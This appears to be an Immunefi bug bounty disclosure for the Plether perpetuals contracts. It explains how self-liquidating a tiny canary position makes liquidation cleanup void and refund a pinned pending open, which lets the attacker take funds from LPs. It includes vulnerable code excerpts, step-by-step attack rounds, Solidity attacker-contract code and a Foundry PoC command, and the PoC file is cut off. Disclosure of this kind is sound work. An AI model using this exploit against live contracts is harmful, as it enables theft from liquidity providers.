# #98941 [CRITICAL]

Source: https://reports.immunefi.com/plether/98941-sc-critical-liquidation-cleanup-refunds-a-pending-open-in-orderrouter-so-an-owner-cancels-its-own-pinned-open-for-free-and-takes-lp-funds

Brief/Intro
An open order's fill price is pinned to the first Pyth tick after its commit, and SECURITY.md says there is no user cancellation path, so a queued open cannot become a free option. Liquidation cleanup is a cancellation path. The owner opens a tiny same-side canary position and commits a large same-side open T on the same account. When the price moves against T after the pinned tick is public, the owner, or any keeper, liquidates the canary; cleanup fails T as AccountLiquidated and refunds its committed margin for the forfeited bounty only. When the price moves T's way, the owner fills T at the stale pinned price. The owner keeps the upside and pays almost nothing on the downside, and the loss comes out of the LP pool. In the run below, five rounds end with the attacker withdrawing 8,374.65 USDG more than it put in, and the victim LP's Junior worth 9,977.92 USDG less than with no attacker.
Vulnerability Details
A trader commits an open through Router.commitOrder . Its fill is priced from the first Pyth update after the commit, so the executor cannot pick the price: the oracle parses with minPublishTime = request.commitTime + 1 ( PletherOracle.sol:610 ). Router.executeLiquidation has no caller restriction ( OrderRouter.sol:493-496 ).
The owner holds two things on one account: a tiny canary position and the pending open T. A LONG gains when the basket price falls, so an adverse move for a LONG open is a rise. The engine decides whether the canary is liquidatable from its exact-price health test. That test reads settlementReachableAssets = pos.margin + snap.traderClaimBalanceForAccount + snap.vpiRebateReserveAssets ( CfdEnginePlanLib.sol:1453 ) and passes pos.margin + snap.traderClaimBalanceForAccount into buildExactPriceRiskState ( CfdEnginePlanLib.sol:1456-1463 ). The pending open's committed margin is in neither. T reserves 40,000 USDG, yet the canary's liquidation threshold is 10 bp whether T is pending or not. So the owner makes the account liquidatable on demand with a 1,100 USDG canary that carries a 10 bp cushion, while 40,000 USDG of its own reserved collateral sits one field away and is ignored.
Router.executeLiquidation reaches _executeLiquidationAtPrice , which liquidates the position and then calls _clearLiquidatedAccountOrders ( router/OrderLiquidationHandler.sol:62-71 ). That loop releases every pending order's reservation and fails it as AccountLiquidated ( router/OrderLiquidationHandler.sol:118-119 ). T's committed margin returns to the account. The whole cost of voiding T is the forfeited open bounty, at most 0.20 USDG.
The guard that should stop this is the order lifecycle rule stated in SECURITY.md:658-659: "binding order semantics and the lack of a user cancellation path prevent traders from turning queued intents into free options". Liquidation cleanup is a user-reachable cancellation path, and the owner opens the canary that triggers it. Nothing in the liquidation path compares T's committed margin against the loss it is meant to cover.
Vulnerable source code
1. The fill is pinned to the first update after the commit @ packages/perps/src/PletherOracle.sol:610
uint64 minPublishTime = request.commitTime + 1 ;
2. Anyone liquidates an account @ packages/perps/src/OrderRouter.sol:493-496
function executeLiquidation (
address account,
bytes [] calldata pythUpdateData
) external payable nonReentrant {
3. The liquidation health test omits the pending open's committed margin @ packages/perps/src/libraries/CfdEnginePlanLib.sol:1453-1463
uint256 settlementReachableAssets = pos.margin + snap.traderClaimBalanceForAccount + snap.vpiRebateReserveAssets;
delta.liquidationReachableCollateralAssets = settlementReachableAssets;
delta.riskState = PositionRiskAccountingLib.buildExactPriceRiskState(
pos,
snap.positionEntryCostAssetAtoms,
price,
snap.capPrice,
pos.margin + snap.traderClaimBalanceForAccount,
maintMarginBps
);
4. Liquidation cleanup refunds every pending open and fails it as AccountLiquidated @ packages/perps/src/router/OrderLiquidationHandler.sol:116-120
clearinghouse.releaseOrderReservationForTerminalCleanup(orderId);
emit OrderFailed(orderId, OrderFailReason.AccountLiquidated);
_deleteOrder(orderId, IOrderRouterAccounting.OrderStatus.Failed);
5. The cleanup is reached from the public liquidation path @ packages/perps/src/router/OrderLiquidationHandler.sol:62-71
outcome = engine.liquidatePosition(account, executionPrice, housePoolDepth, publishTime, keeper);
_clearLiquidatedAccountOrders(
account,
orderIds,
orderBountiesAssets,
executionPrice,
neutralMarkPrice,
housePoolDepth,
publishTime,
keeper
);
Impact Details
- Impact row: "Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield" (Critical). Over five rounds the attacker withdraws its whole balance and ends with 508,374.65 USDG against the 500,000.00 USDG it deposited, +8,374.65 USDG. The victim LP's Junior is worth 9,990,022.08 USDG against 9,999,999.99 USDG with no attacker, -9,977.92 USDG, and -21,010.53 USDG against the honest control.
- Prerequisites, all permissionless: trading capital in an ordinary contract account, a 1,100 USDG same-side canary position, and the large same-side open T. No LP position, no keeper or owner role, no special pool state.
- The victim never sees a cancellation. The owner never calls settleLpEpoch and never moves pool depth. The open fails as AccountLiquidated , the same receipt an ordinary liquidated account produces.
- It repeats every round. Each adverse round voids T for the canary's loss of about 3.52 USDG; each favorable round fills T at the stale pinned price. The same five orders without the lever lose 15,036.16 USDG.
- An unrelated keeper liquidating the canary also voids T, so the owner does not need to send the liquidation itself.
- Dedup. SC-M4 in the pre-audit report is a free-option attack where "the attacker can trigger a full margin refund on the losing order by manipulating the vault depth", marked "Fixed in Plether-Fi/plether-core#24." The program rule is: "For findings marked as fixed or Acknowledged in the reports above, a report on the same root cause is valid only if it shows that the fix at commit a82d4fefb02768e5b3bddcc97dee371eee24fea8 is incomplete or introduces a new bug." The run is at that commit, and T is voided with no vault-depth change. My confirmed report #97858 voids its open through settleLpEpoch and a pool-cash change, so the open fails the planner with PlannerRejected , fixed by pinning pool depth. This report voids the open through liquidation cleanup, so it fails with AccountLiquidated , and the root is the missing pending-open margin in CfdEnginePlanLib.sol:1453 . Pinning pool depth does not touch this path, and counting the pending-open margin does not touch #97858. Different root, different fix.
References
Order pricing and liquidation entry
- packages/perps/src/PletherOracle.sol:610 - fill pinned to the first update after commitTime
- packages/perps/src/OrderRouter.sol:493-496 - executeLiquidation , any caller
Liquidation health test and cleanup
- packages/perps/src/libraries/CfdEnginePlanLib.sol:1453-1463 - exact-price health test, pending-open margin omitted
- packages/perps/src/router/OrderLiquidationHandler.sol:62-71 - cleanup reached from the public liquidation path
- packages/perps/src/router/OrderLiquidationHandler.sol:116-120 - every pending open refunded and failed AccountLiquidated
Guarantee and prior finding
- packages/perps/SECURITY.md:658-659 - "lack of a user cancellation path"
- audits/plether-pre-audit-report.pdf, SC-M4 - "Fixed in Plether-Fi/plether-core#24."
Link to Proof of Concept
https://gist.github.com/decies-centena-millia/5036463a61c9ad9db6b3e2d31cc9f1a7
Proof of Concept
Proof of Concept
One Foundry test file on the repo's own BasePerpTest with the DEPLOYMENT.md release parameters, asserted in setUp . It drives only public calls and reads every number back from the deployed contracts: the attacker's USDG wallet after withdrawal, the victim's Junior value from the vault, and the voided open's terminal receipt. Only USDG and Pyth are the repo's mocks, as the program permits.
All files and the full run output are in a secret gist: https://gist.github.com/decies-centena-millia/5036463a61c9ad9db6b3e2d31cc9f1a7
mkdir -p packages/perps/test/poc && cp LiquidationCleanupFreeCancelPoC.t.sol packages/perps/test/poc/ && cd packages/perps && forge test --match-path test /poc/LiquidationCleanupFreeCancelPoC.t.sol -vv
attack step-by-step
- Monday 10:00 UTC: victim LP_J holds 10,000,000 USDG of Junior. ATTACKER funds a CanaryAccount with 500,000 USDG.
- Each round the account opens a 1,100 USDG same-side canary position, filled by a keeper at the mark. The canary carries a 10 bp cushion.
- The account commits the 2,000,000 USDG open T with 40,000 USDG of margin. T pins to the next tick at the current price.
- Favorable move (price falls for the LONG): executeOrder fills T at the stale pinned price, and the account closes at the better price.
- Adverse move (price rises): executeLiquidation(self) at the moved price liquidates the canary; cleanup fails T as AccountLiquidated and refunds its 40,000 USDG. The account is flat for about 3.52 USDG.
- After five rounds the account withdraws its whole balance to the attacker's wallet.
main Attack code
// The attacker's trading account. It never calls settleLpEpoch and never touches pool depth.
// Its only lever is executeLiquidation(address(this)) on its own canary, which cleans up the pending open.
contract CanaryAccount {
function commit ( OrderV3Types.OrderRequest calldata request ) external onlyOwner returns ( uint64 orderId ) {
orderId = router.commitOrder(request);
}
function execute ( uint64 id, bytes [] calldata pinned ) external onlyOwner returns ( OrderV3Types.ExecutionResult memory r ) {
r = router.executeOrder(id, pinned);
}
// The whole lever: liquidate this account's own canary at the moved price. Cleanup voids every pending order.
function voidViaOwnLiquidation ( bytes [] calldata live ) external onlyOwner {
router.executeLiquidation( address ( this ), live);
}
function withdrawAll ( ) external onlyOwner {
uint256 bal = clearinghouse.balanceAssets( address ( this ));
if (bal ! = 0 ) clearinghouse.withdrawMargin(bal);
uint256 w = usdg.balanceOf( address ( this ));
if (w ! = 0 ) usdg. transfer (owner, w);
}
}
// one round: canary, then the open T pinned at PX, then the owner's decision after the move
_openCanary();
uint64 t = _commit(CfdTypes.Side.LONG, _sizeFor(T_NOTIONAL, PX), T_MARGIN, false );
_advance( 1 ); // commit + 1: the pinned tick exists at PX
_advance( 2 ); // the owner has now seen the move
uint256 p1 = _price(_favorable(k));
if (_favorable(k)) {
require (_executed(_ownerExec(t, PX)), "favorable fill at stale pin" ); // fill T at the stale price
_closeAll(p1); // close at the better price
} else {
bytes [] memory d = _tick(p1, _now());
vm.prank(ATTACKER);
acct.voidViaOwnLiquidation(d); // liquidate the canary, void T
require (_reason(t) = = OrderV3Types.TerminalReason.AccountLiquidated, "T voided via liquidation cleanup" );
require (_sizeOf( address (acct)) = = 0 , "flat after void" );
}
plant : open a tiny same-side canary, then commit the large same-side open T pinned to the next tick
fire : liquidate your own canary; cleanup voids T and refunds its 40,000 USDG margin, so you only ever keep T when it already won
full poc code, single file, single runnable command
Foundry forge 1.8.5 (commit 51a52c59 ), solc 0.8.35 , via_ir = true , optimizer_runs = 200 , from the repo's own packages/perps/foundry.toml . The test runs on the repo's test/perps/BasePerpTest.sol fixture, which is provided by the program, so only this one file is added.
LiquidationCleanupFreeCancelPoC.t.sol
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;
// PoC: liquidation cleanup is a price-conditional, (near-)free cancel of a pending open.
// Sibling of the confirmed Critical #97858 (lp-settlement-cancels-own-open): same impa
